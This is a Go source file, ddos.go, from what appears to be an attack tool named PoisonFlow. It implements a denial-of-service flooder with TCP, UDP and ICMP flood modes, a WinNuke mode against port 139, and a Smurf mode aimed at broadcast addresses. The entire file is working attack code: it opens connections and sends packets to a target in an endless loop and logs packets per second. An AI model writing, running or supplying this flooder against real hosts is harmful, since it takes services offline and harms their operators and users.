// Package utils -----------------------------
// @file      : ddos.go
// @author    : fzf
// @time      : 2023/5/9 上午10:28
// -------------------------------------------
package utils

import (
	"PoisonFlow/src/common"
	"fmt"
	"github.com/sirupsen/logrus"
	"net"
	"os"
	"os/signal"
	"strings"
	"syscall"
	"time"
)

var (
	CountPacket int
	packet      int
)

type DdosAPP struct {
}

func (p *DdosAPP) Execute(config *common.ConfigType) {
	var address = fmt.Sprintf("%s:%d", config.Host, config.Port)
	switch config.Mode {
	case "TCP":
		p.TCPFlood(address)
	case "UDP":
		p.UDPFlood(address)
	case "ICMP":
		p.ICMPFlood(config.Host)
	case "WinNuke":
		var address = fmt.Sprintf("%s:%d", config.Host, 139)
		p.TCPFlood(address)
	case "Smurf":
		if strings.HasSuffix(config.Host, "255") {
			p.ICMPFlood(config.Host)
		} else {
			logrus.Errorf("Please check format of Smurf host : 192.168.255.255")
		}
	default:
		Check.CheckExit("Please check format of ddos mode : TCP、UDP、ICMP、WinNuke、Smurf")
	}
}

func (p *DdosAPP) ICMPFlood(host string) {
	p.SendPacket("ip4:icmp", host)
}

func (p *DdosAPP) UDPFlood(address string) {
	p.SendPacket("udp", address)
}

func (p *DdosAPP) TCPFlood(address string) {
	p.SendPacket("tcp", address)

}

func (p *DdosAPP) SendPacket(mode, address string) {
	// 捕获ctrl+c
	c := make(chan os.Signal, 1)
	signal.Notify(c, syscall.SIGINT, syscall.SIGTERM)
	go p.CountPacket()
	// 发送数据包
	for {
		select {
		// 捕获ctrl + c
		case _ = <-c:
			logrus.Printf("stopped sending a total of %d packets", CountPacket)
			os.Exit(0)
		default:
			conn, err := net.DialTimeout(mode, address, time.Millisecond*300)
			packet++
			if err != nil {
				break
			}
			_, err = conn.Write([]byte(address))
			if err != nil {
				break
			}
		}
	}
}

func (p *DdosAPP) CountPacket() {
	// 3秒中

	ticker := time.NewTicker(3 * time.Second)
	defer ticker.Stop()
	// 协程输出发送pps
	for range ticker.C {
		logrus.Infof("Sended packet : %d  pps: %d \n", packet, packet/3)
		CountPacket += packet
		packet = 0
	}

}
